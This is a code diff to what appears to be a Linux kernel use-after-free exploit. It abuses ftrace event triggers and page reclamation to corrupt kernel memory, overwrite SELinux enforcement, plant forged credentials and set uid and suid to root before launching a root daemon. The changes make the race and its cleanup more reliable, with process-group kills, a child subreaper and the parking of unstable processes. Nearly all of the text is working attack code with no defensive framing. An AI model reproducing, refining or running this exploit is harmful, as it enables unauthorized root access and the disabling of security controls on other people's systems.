@@ -17,6 +17,7 @@
 #include <string.h>
 #include <sys/socket.h>
 #include <sys/mman.h>
+#include <sys/prctl.h>
 #include <sys/syscall.h>
 #include <sys/wait.h>
 #include <time.h>
@@ -780,6 +781,7 @@ static int child_race(void)
 	pthread_t exec_thread;
 	sigset_t block;
 	int tgid = (int)getpid();
+	(void)setpgid(0, 0);
 	sigemptyset(&block);
 	sigaddset(&block, SIGRTMIN);
 	sigprocmask(SIG_BLOCK, &block, NULL);
@@ -827,6 +829,39 @@ static void stop_helpers(void)
 			kill(ipc->helpers[i], SIGKILL);
 	}
 }
+
+static void cleanup_uaf_group(pid_t child, int *status_out)
+{
+	int status = 0;
+	int helpers;
+	if (!ipc)
+		return;
+	helpers = ipc->nhelpers;
+	if (child > 0) {
+		(void)kill(-child, SIGKILL);
+		(void)kill(child, SIGKILL);
+	}
+	stop_helpers();
+	if (child > 0) {
+		while (waitpid(child, &status, 0) < 0 && errno == EINTR) {}
+		for (int i = 0; i < ipc->nhelpers && i < 4; i++) {
+			int helper_status;
+			pid_t helper = ipc->helpers[i];
+			if (helper <= 0 || helper == child)
+				continue;
+			while (waitpid(helper, &helper_status, 0) < 0 && errno == EINTR) {}
+		}
+	}
+	ipc->nhelpers = 0;
+	dprintf(STDOUT_FILENO, "[uaf] cleanup child=%d helpers=%d\n",
+		(int)child, helpers);
+	if (status_out)
+		*status_out = status;
+}
+
+#define UAF_SAFE_RETRY (-1)
+#define UAF_POISONED (-2)
+
 static int wait_zombie(pid_t child, int *status_out)
 {
 	for (int i = 0; i < 400; i++) {
@@ -1493,18 +1528,21 @@ static int one_uaf(uint64_t target)
 {
 	pid_t child;
 	int code, status = 0;
-	uint64_t ptrs[64];
-	int nptr, ntext;
+	int nptr;
 	uint64_t victim;
+	if (ipc->nhelpers != 0) {
+		dprintf(STDOUT_FILENO,
+			"[uaf] stale helpers=%d; refusing retry\n", ipc->nhelpers);
+		return UAF_POISONED;
+	}
 	atomic_store_explicit(&g_go, 0, memory_order_relaxed);
 	atomic_store_explicit(&g_stop, 0, memory_order_relaxed);
 	atomic_store_explicit(&g_lockers, 0, memory_order_relaxed);
 	atomic_store_explicit(&g_exec_tid, 0, memory_order_relaxed);
 	atomic_store_explicit(&ipc->phase, 0, memory_order_relaxed);
-	ipc->nhelpers = 0;
 	child = fork();
 	if (child < 0)
-		return -1;
+		return UAF_SAFE_RETRY;
 	if (child == 0) {
 		if (g_wake[0] >= 0)
 			close(g_wake[0]);
@@ -1515,47 +1553,42 @@ static int one_uaf(uint64_t target)
 		if (g_report[1] >= 0)
 			close(g_report[1]);
 		child_race();
+		_exit(119);
 	}
+	(void)setpgid(child, child);
 	if (wait_phase(1)) {
 		dprintf(STDOUT_FILENO, "[uaf] child never readied phase=%d\n",
 			atomic_load_explicit(&ipc->phase, memory_order_acquire));
-		kill(child, SIGKILL);
-		stop_helpers();
-		waitpid(child, NULL, 0);
-		return -1;
+		cleanup_uaf_group(child, &status);
+		return UAF_SAFE_RETRY;
 	}
 	if (write_file(TRACE "/buffer_size_kb", "16384\n") ||
 	    trigger_cmd("enable_event:kmem:kmem_cache_alloc\n") || kick_rss() ||
 	    trace_off_on()) {
-		kill(child, SIGKILL);
-		stop_helpers();
-		return -1;
+		cleanup_uaf_group(child, &status);
+		return UAF_SAFE_RETRY;
 	}
 	atomic_store_explicit(&ipc->phase, 2, memory_order_release);
 	if (wait_phase(3)) {
 		dprintf(STDOUT_FILENO, "[uaf] timer was not created\n");
 		write_file(TRACE "/tracing_on", "0\n");
-		kill(child, SIGKILL);
-		stop_helpers();
-		waitpid(child, NULL, 0);
-		return -1;
+		cleanup_uaf_group(child, &status);
+		return UAF_SAFE_RETRY;
 	}
 	write_file(TRACE "/tracing_on", "0\n");
 	if (collect_nth(1024, &nptr, &victim)) {
-		kill(child, SIGKILL);
-		stop_helpers();
-		waitpid(child, NULL, 0);
-		return -1;
+		cleanup_uaf_group(child, &status);
+		return UAF_SAFE_RETRY;
 	}
 	if (nptr < 1500) {
 		dprintf(STDOUT_FILENO, "[uaf] too few timers\n");
-		kill(child, SIGKILL);
-		stop_helpers();
-		waitpid(child, NULL, 0);
-		return -1;
+		cleanup_uaf_group(child, &status);
+		return UAF_SAFE_RETRY;
 	}
-	if (trigger_cmd("disable_event:kmem:kmem_cache_alloc\n"))
-		return -1;
+	if (trigger_cmd("disable_event:kmem:kmem_cache_alloc\n")) {
+		cleanup_uaf_group(child, &status);
+		return UAF_SAFE_RETRY;
+	}
 	kick_rss();
 	trigger_cmd("!disable_event:kmem:kmem_cache_alloc\n");
 	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
@@ -1563,22 +1596,25 @@ static int one_uaf(uint64_t target)
 	if (g_plant_cred)
 		g_cred_kva = victim + g_kitimer_node;
 	if (reclaim_stream(victim, target)) {
-		dprintf(STDOUT_FILENO, "[uaf] page miss, retry\n");
+		dprintf(STDOUT_FILENO, "[uaf] page miss; parking unsafe process\n");
 		stop_helpers();
-		return -1;
+		return UAF_POISONED;
 	}
 	close_socks();
 	code = wait_zombie(child, &status);
 	dprintf(STDOUT_FILENO, "[uaf] child=%d code=%d status=%d\n",
 		child, code, status);
-	if (waitpid(child, &status, 0) < 0)
-		return -1;
+	if (code == 0) {
+		dprintf(STDOUT_FILENO, "[uaf] reap timeout; parking unsafe process\n");
+		stop_helpers();
+		return UAF_POISONED;
+	}
+	cleanup_uaf_group(child, &status);
 	dprintf(STDOUT_FILENO, "[uaf] reaped status=%d\n", status);
 	destroy_rings();
-	stop_helpers();
 	if (!WIFSIGNALED(status) || WTERMSIG(status) != SIGKILL) {
-		dprintf(STDOUT_FILENO, "[uaf] reap was not SIGKILL\n");
-		return -1;
+		dprintf(STDOUT_FILENO, "[uaf] reap was not SIGKILL; parking\n");
+		return UAF_POISONED;
 	}
 	return 0;
 }
@@ -1599,8 +1635,16 @@ static void cred_child(void)
 		unsigned uid, euid, gid, egid;
 		unsigned char go;
 		char msg[96];
-		if (read(g_wake[0], &go, 1) != 1)
+		ssize_t got = read(g_wake[0], &go, 1);
+		if (got < 0 && errno == EINTR)
 			continue;
+		if (got != 1) {
+			dprintf(STDOUT_FILENO,
+				"[child-cred] wake pipe closed n=%zd errno=%d; parking\n",
+				got, errno);
+			for (;;)
+				pause();
+		}
 		uid = getuid();
 		euid = geteuid();
 		gid = getgid();
@@ -1610,8 +1654,13 @@ static void cred_child(void)
 		if (write(g_report[1], msg, strlen(msg)) < 0)
 			dprintf(STDOUT_FILENO, "[child-cred] answer errno=%d\n", errno);
 		dprintf(STDOUT_FILENO, "[child-cred] %s", msg);
-		if (uid == 0 && euid == 0)
-			pc98260_run_rootd();
+		if (uid == 0 && euid == 0) {
+			int rootd_rc = pc98260_run_rootd();
+			dprintf(STDOUT_FILENO,
+				"[child-cred] rootd returned rc=%d; parking\n", rootd_rc);
+			for (;;)
+				pause();
+		}
 	}
 }
 
@@ -1771,6 +1820,14 @@ static void read_enforce(void)
 	close(fd);
 }
 
+static void park_poisoned_process(void)
+{
+	dprintf(STDOUT_FILENO,
+		"[uaf] unsafe state; holding process until reboot\n");
+	for (;;)
+		pause();
+}
+
 int pc98260_run_rootd(void);
 
 int main(int argc, char **argv)
@@ -1850,6 +1907,8 @@ int main(int argc, char **argv)
 	if (ipc == MAP_FAILED)
 		return 1;
 	memset(ipc, 0, sizeof(*ipc));
+	if (prctl(PR_SET_CHILD_SUBREAPER, 1))
+		dprintf(STDOUT_FILENO, "[uaf] subreaper errno=%d\n", errno);
 	if (pin_cpu(0))
 		return 1;
 	g_ctx = calloc(MAX_RINGS, sizeof(*g_ctx));
@@ -1886,7 +1945,10 @@ int main(int argc, char **argv)
 			dprintf(STDOUT_FILENO,
 				"[selinux] attempt %d/4 target=%#" PRIx64 "\n",
 				i, sel);
-			if (!one_uaf(sel))
+			int rc = one_uaf(sel);
+			if (rc == UAF_POISONED)
+				park_poisoned_process();
+			if (rc == 0)
 				read_enforce();
 		}
 	}
@@ -1897,14 +1959,25 @@ int main(int argc, char **argv)
 		int fixed_uid = -1, fixed_suid = -1;
 		dprintf(STDOUT_FILENO, "[cred] plant attempt %d/12\n", attempt);
 		g_plant_cred = 1;
-		if (one_uaf(0))
+		int rc = one_uaf(0);
+		if (rc == UAF_POISONED)
+			park_poisoned_process();
+		if (rc != 0)
 			continue;
 		g_plant_cred = 0;
 		dprintf(STDOUT_FILENO, "[cred] installed at %#" PRIx64 "\n", g_cred_kva);
-		for (int i = 0; i < 3 && fixed_uid; i++)
-			fixed_uid = one_uaf(g_cred_kva + 8);
-		for (int i = 0; i < 3 && fixed_suid; i++)
-			fixed_suid = one_uaf(g_cred_kva + 16);
+		for (int i = 0; i < 3 && fixed_uid; i++) {
+			rc = one_uaf(g_cred_kva + 8);
+			if (rc == UAF_POISONED)
+				park_poisoned_process();
+			fixed_uid = rc == 0 ? 0 : -1;
+		}
+		for (int i = 0; i < 3 && fixed_suid; i++) {
+			rc = one_uaf(g_cred_kva + 16);
+			if (rc == UAF_POISONED)
+				park_poisoned_process();
+			fixed_suid = rc == 0 ? 0 : -1;
+		}
 		if (ask_child(&uid, &euid) == 0 && uid == 0 && euid == 0)
 			rooted = 1;
 		else if (uid == 1 && euid == 1)
@@ -1913,9 +1986,7 @@ int main(int argc, char **argv)
 			dprintf(STDOUT_FILENO, "[cred] still uid=%u euid=%u\n", uid, euid);
 	}
 	if (!rooted) {
-		dprintf(STDOUT_FILENO, "[uaf] missed page; holding zombie\n");
-		for (;;)
-			pause();
+		park_poisoned_process();
 	}
 	dprintf(STDOUT_FILENO, "[cred] child=%d holding pages\n", g_cred_child_pid);
 	for (;;)
